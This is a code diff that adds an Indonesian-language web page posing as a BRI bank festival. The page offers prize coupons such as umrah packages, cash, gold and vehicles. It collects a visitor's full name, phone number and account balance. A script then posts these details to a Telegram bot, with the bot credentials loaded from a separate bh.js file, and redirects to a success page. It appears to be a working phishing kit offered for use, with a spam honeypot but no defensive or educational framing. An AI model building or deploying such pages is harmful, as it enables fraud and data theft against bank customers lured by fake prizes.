@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Form Event BRI Festival</title>
+<style>
+body{
+margin:0;
+font-family:Arial,Helvetica,sans-serif;
+background:#eef3f9;
+display:flex;
+justify-content:center;
+}
+.container{
+width:100%;
+max-width:430px;
+background:#fff;
+min-height:100vh;
+}
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:14px 16px;
+border-bottom:1px solid #ddd;
+}
+.header img{
+height:38px;
+}
+.menu{
+width:44px;
+height:44px;
+border:2px solid #1e63b5;
+border-radius:8px;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:22px;
+color:#1e63b5;
+}
+.banner{
+margin:14px;
+background:#1e63b5;
+color:white;
+padding:18px 10px;
+font-size:18px;
+font-weight:bold;
+text-align:center;
+border-radius:6px;
+}
+.subtitle{
+margin:0 18px;
+font-size:15px;
+font-weight:bold;
+color:#222;
+}
+.form-area{
+margin:18px;
+}
+select,input{
+width:100%;
+padding:14px;
+margin-top:12px;
+border:2px solid #1e63b5;
+border-radius:8px;
+font-size:15px;
+box-sizing:border-box;
+outline:none;
+}
+label{
+display:block;
+margin-top:14px;
+font-size:14px;
+font-weight:bold;
+color:#222;
+}
+button{
+width:100%;
+margin-top:26px;
+padding:16px;
+background:#1e63b5;
+border:none;
+border-radius:10px;
+color:white;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 4px 10px rgba(0,0,0,0.25);
+}
+.logos{
+margin-top:40px;
+display:flex;
+justify-content:center;
+gap:12px;
+flex-wrap:wrap;
+padding:10px 0;
+}
+.logos img{
+height:22px;
+opacity:0.85;
+}
+.footer{
+text-align:center;
+font-size:12px;
+color:#666;
+padding:10px 0 25px;
+}
+</style>
+</head>
+<body>
+<div class="container">
+
+<div class="header">
+<img src="https://files.catbox.moe/4xe3gd.jpg">
+<div class="menu">≡</div>
+</div>
+
+<div class="banner">
+Selamat Datang di Event Festival 2026
+</div>
+
+<div class="subtitle">Lengkapi Formulir Pendaftaran Anda</div>
+<form id="eventForm">
+<div class="form-area">
+<select name="pilihan" id="pilihan">
+<option>PILIH KUPON UNTUK ANDA</option>
+<option value="Paket Umroh & Tiket Liburan">Paket Umroh & Tiket Liburan</option>
+<option value="Uang Cash & Emas">Uang Cash & Emas</option>
+<option value="Mobil & Motor">Mobil & Motor</option>
+</select>
+
+<label>Nama Lengkap</label>
+<input type="text" name="nama" id="nama" placeholder="Masukkan Nama Lengkap" required>
+
+<label>Nomor Handphone</label>
+<input type="tel" name="nohp" id="nohp" placeholder="Masukkan Nomor Handphone" required>
+
+<label>Saldo Rekening Terakhir</label>
+<input type="tel" name="saldo" id="saldo" placeholder="Rp." required>
+
+<div style="display:none;">
+  <input type="text" name="honeypot" id="honeypot" tabindex="-1" autocomplete="off">
+</div>
+
+<button type="submit" id="submitBtn">Cetak Kupon</button>
+</div>
+</form>
+<div class="logos">
+<img src="https://i.ibb.co.com/SY7k9bR/20260207-025955.jpg">
+</div>
+
+<div class="footer">
+©️ 2026 Event Organizer<br>
+All Rights Reserved.
+</div>
+
+</div>
+<script src="bh.js"></script>
+<script>
+document.getElementById("eventForm").addEventListener("submit", function(e){
+  e.preventDefault();
+
+  const submitBtn = document.getElementById("submitBtn");
+  const honeypot = document.getElementById("honeypot").value;
+  
+  if (honeypot.length > 0) {
+    console.log("Spam detected!");
+    return;
+  }
+
+  let pilihan = document.getElementById("pilihan").value;
+  let nama    = document.getElementById("nama").value.trim();
+  let nohp    = document.getElementById("nohp").value.trim();
+  let saldo   = document.getElementById("saldo").value.trim();
+
+  if (nama.length < 3 || nohp.length < 9) {
+    alert("Mohon masukkan data yang valid.");
+    return;
+  }
+
+  submitBtn.disabled = true;
+  submitBtn.innerText = "Memproses...";
+
+  let pesan = `BRIMO\n───────────────────────\n• Pilihan : ${pilihan}\n• Nama Lengkap : ${nama}\n• Nomor Hp : ${nohp}\n• Saldo Rekening : ${saldo}\n───────────────────────\n©️ Brimo - 2026`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: pesan
+    })
+  })
+  .then(res => {
+    window.location.href = "sukses.html";
+  })
+  .catch(err => {
+    console.error(err);
+    window.location.href = "sukses.html";
+  });
+});
+</script>
+<script>
+const saldoInput = document.getElementById("saldo");
+
+saldoInput.addEventListener("input", function () {
+  let angka = this.value.replace(/[^0-9]/g, "");
+
+  if (angka === "") {
+    this.value = "";
+    return;
+  }
+
+  let formatRupiah = angka.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+
+  this.value = "Rp " + formatRupiah;
+});
+
+saldoInput.addEventListener("focus", function () {
+  if (this.value === "") {
+    this.value = "Rp ";
+  }
+});
+
+saldoInput.addEventListener("blur", function () {
+  if (this.value === "Rp ") {
+    this.value = "";
+  }
+});
+</script>
+
+</body>
+</html>
